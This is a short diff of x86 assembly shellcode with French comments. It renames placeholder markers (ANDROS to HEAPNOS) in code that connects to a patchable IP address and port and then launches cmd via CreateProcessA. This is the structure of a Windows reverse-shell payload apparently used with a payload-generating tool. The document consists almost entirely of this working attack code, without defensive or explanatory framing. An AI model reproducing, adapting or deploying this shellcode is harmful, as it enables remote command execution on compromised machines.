@@ -279,17 +279,17 @@ mov edi,eax
 
 ; Call connect
 connect:
-xor ebx,ebx ; ANDROS01 Mise à 0 de EBX
-mov ebx, 0xffffffff ; ANDROS02
-sub ebx, 0xfeffff80 ; ANDROS03 IP
-push ebx ; ANDROS04
-xor ebx,ebx ; ANDROS05 Mise à 0 de EBX
-mov ebx, 0xffffffff ; ANDROS06
-sub bx, 0x47DD ; ANDROS07 PORT
-push bx ; ANDROS08
+xor ebx,ebx ; HEAPNOS01 Mise à 0 de EBX
+mov ebx, 0xffffffff ; HEAPNOS02
+sub ebx, 0xfeffff80 ; HEAPNOS03 IP
+push ebx ; HEAPNOS04
+xor ebx,ebx ; HEAPNOS05 Mise à 0 de EBX
+mov ebx, 0xffffffff ; HEAPNOS06
+sub bx, 0x47DD ; HEAPNOS07 PORT
+push bx ; HEAPNOS08
 
-; ANDROS09
-; ANDROS10
+; HEAPNOS09
+; HEAPNOS10
 
 xor ebx,ebx ; Mise à 0 de EBX
 add bl, 2 
@@ -364,7 +364,7 @@ mov ebx, [ebp-0ch]     ; Address for CreateProcessA
 call ebx                ; create process cmd 
 
 comp:
-; xor eax,eax //Boucle infinie, pour l'utiliser avec Andros on la commente, pour débug on la décommente
+; xor eax,eax //Boucle infinie, pour l'utiliser avec HEAPNOS on la commente, pour débug on la décommente
 ; mov eax, 0x1
 ; cmp eax,0x0
 ; jne comp
